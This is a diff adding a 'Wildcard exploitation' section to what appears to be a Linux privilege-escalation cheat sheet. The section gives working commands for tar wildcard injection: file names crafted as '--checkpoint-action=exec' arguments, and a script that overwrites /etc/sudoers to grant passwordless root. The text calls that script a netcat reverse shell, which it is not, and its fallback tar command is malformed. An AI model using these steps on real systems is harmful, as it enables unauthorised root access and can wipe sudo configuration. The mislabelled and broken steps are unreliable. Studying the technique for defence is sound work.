@@ -251,6 +251,22 @@ Get a way to exploit misconfigured linux systems by means of [GTFO bins](https:/
 
 Check for backup scripts and check for write permissions.
 
+## Wildcard exploitation
+
+The wildcard `*` character allows to manage multiple data. For example, it could be used to backup all files in a specified folder: `tar cf /home/username/backups/backup.tgz /var/www/html/*` (eg. this command could be executed by a crontab). We can exploit the wildcard character to gain a reverse shell. This is obtained by passing special crafted files to the compressing function. These files will be considered as input parameters:
+
+- Change directory to the one whose file will be compressed (eg. /var/www/html)
+- Create a netcat reverse shell script:
+                  
+      echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > test.sh
+
+- Create the two input parameter files:
+
+      echo "" > "--checkpoint-action=exec=sh test.sh"
+      echo "" > --checkpoint=1
+
+- Wait for the reverse shell to be executed via cronjob (hoping for privilege escalation), otherwise execute: `tar archive.tar *`
+
 ## Docker exploitation
 
 
